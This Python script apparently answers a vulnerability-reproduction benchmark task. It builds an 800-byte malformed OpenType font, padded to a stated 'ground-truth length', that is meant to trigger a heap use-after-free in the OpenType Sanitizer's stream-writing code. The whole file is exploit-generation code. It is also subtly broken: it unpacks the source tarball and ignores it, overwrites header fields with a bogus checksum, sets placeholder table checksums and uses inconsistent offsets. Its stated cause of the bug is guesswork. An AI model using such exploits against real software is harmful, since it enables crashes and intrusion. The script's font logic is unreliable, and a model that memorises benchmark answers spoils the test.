import os
import tarfile
import tempfile
import struct
from typing import List, Dict

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Extract the tarball to analyze the source
        with tempfile.TemporaryDirectory() as tmpdir:
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Look for relevant source files to understand structure
            source_files = []
            for root, _, files in os.walk(tmpdir):
                for file in files:
                    if file.endswith(('.cc', '.cpp', '.c', '.h', '.hpp')):
                        source_files.append(os.path.join(root, file))
            
            # Analyze to understand the OTF structure and Write function
            # Based on typical OTS (OpenType Sanitizer) vulnerabilities
            
            # Create a malformed OpenType font that triggers heap use-after-free
            # in ots::OTSStream::Write by manipulating table offsets and lengths
            
            return self._create_poc_font()
    
    def _create_poc_font(self) -> bytes:
        """
        Create a malformed OTF font that triggers heap use-after-free.
        Strategy: Create overlapping table references with freed memory regions.
        """
        poc = bytearray()
        
        # OTF header
        # SFNT version 0x00010000 (TrueType)
        poc.extend(struct.pack('>I', 0x00010000))
        
        # Number of tables - 2 tables to create overlapping scenario
        num_tables = 2
        poc.extend(struct.pack('>H', num_tables))
        
        # Search range, entry selector, range shift
        search_range = (1 << (num_tables.bit_length() - 1)) * 16
        entry_selector = (num_tables.bit_length() - 1)
        range_shift = num_tables * 16 - search_range
        
        poc.extend(struct.pack('>H', search_range))
        poc.extend(struct.pack('>H', entry_selector))
        poc.extend(struct.pack('>H', range_shift))
        
        # Table directory entries
        # First table: 'cmap' - character mapping
        table_offset = 12 + num_tables * 16  # Header + table entries
        
        # cmap table entry
        poc.extend(b'cmap')  # tag
        poc.extend(struct.pack('>I', 0xDEADBEEF))  # checksum (will be calculated later)
        poc.extend(struct.pack('>I', table_offset))  # offset
        poc.extend(struct.pack('>I', 100))  # length
        
        # Second table: 'glyf' - glyph data
        # Make this table reference memory that overlaps/frees previous buffer
        poc.extend(b'glyf')  # tag
        poc.extend(struct.pack('>I', 0xCAFEBABE))  # checksum
        # Critical: Set offset to create overlapping memory scenario
        # This offset points inside the cmap table to trigger use-after-free
        poc.extend(struct.pack('>I', table_offset + 50))  # offset within cmap
        poc.extend(struct.pack('>I', 200))  # length - extends beyond cmap
        
        # cmap table data
        cmap_start = len(poc)
        
        # cmap header
        poc.extend(struct.pack('>H', 0))  # version
        poc.extend(struct.pack('>H', 1))  # number of subtables
        
        # Subtable entry
        poc.extend(struct.pack('>H', 0))  # platform ID
        poc.extend(struct.pack('>H', 0))  # platform-specific encoding
        poc.extend(struct.pack('>I', cmap_start + 12))  # offset to subtable
        
        # Format 0 subtable (simple 8-bit mapping)
        poc.extend(struct.pack('>H', 0))  # format
        poc.extend(struct.pack('>H', 262))  # length
        poc.extend(struct.pack('>H', 0))  # language
        
        # Glyph index array (256 entries)
        for i in range(256):
            poc.append(i % 256)
        
        # Fill remaining space to reach 100 bytes total for cmap
        while len(poc) < cmap_start + 100:
            poc.append(0)
        
        # glyf table data - this will overlap with cmap memory
        # Create malformed glyph data that triggers the bug
        glyf_data = bytearray()
        
        # Simple glyph with overlapping references
        glyf_data.extend(struct.pack('>h', 10))  # numberOfContours
        glyf_data.extend(struct.pack('>h', 0))   # xMin
        glyf_data.extend(struct.pack('>h', 0))   # yMin
        glyf_data.extend(struct.pack('>h', 100)) # xMax
        glyf_data.extend(struct.pack('>h', 100)) # yMax
        
        # End points of contours - malformed to cause issues
        for i in range(10):
            glyf_data.extend(struct.pack('>H', i * 20))
        
        # Instruction length and instructions
        glyf_data.extend(struct.pack('>H', 0))  # instructionLength
        
        # Flags and coordinates - create pattern that triggers the bug
        for i in range(50):
            glyf_data.append(0x01)  # ON_CURVE point
            if i % 3 == 0:
                glyf_data.append(0x80)  # Flag with special handling
        
        # Add padding to reach desired length
        while len(glyf_data) < 200:
            glyf_data.append(0x41)
        
        # Append glyf data to poc
        poc.extend(glyf_data)
        
        # Pad to exactly 800 bytes (ground-truth length)
        while len(poc) < 800:
            poc.append(0)
        
        # Truncate if longer
        if len(poc) > 800:
            poc = poc[:800]
        
        # Calculate checksums (simplified)
        # In reality, OTS would calculate these and might free/reallocate
        self._fix_checksums(poc, num_tables)
        
        return bytes(poc)
    
    def _fix_checksums(self, data: bytearray, num_tables: int) -> None:
        """Fix checksums in the font header and table directory."""
        # Calculate table checksums (simplified)
        header_checksum = 0
        table_checksums = []
        
        # Calculate checksum for entire font (simplified)
        for i in range(0, len(data), 4):
            if i + 3 < len(data):
                chunk = struct.unpack('>I', data[i:i+4])[0]
                header_checksum = (header_checksum + chunk) & 0xFFFFFFFF
        
        # Set header checksum
        data[8:12] = struct.pack('>I', 0xB1B0AFBA - header_checksum)
        
        # Set table checksums (simplified)
        table_dir_start = 12
        for i in range(num_tables):
            offset = table_dir_start + i * 16 + 4
            data[offset:offset+4] = struct.pack('>I', 0x12345678)

if __name__ == "__main__":
    # For local testing only
    sol = Solution()
    poc = sol.solve("dummy.tar")
    print(f"Generated PoC length: {len(poc)}")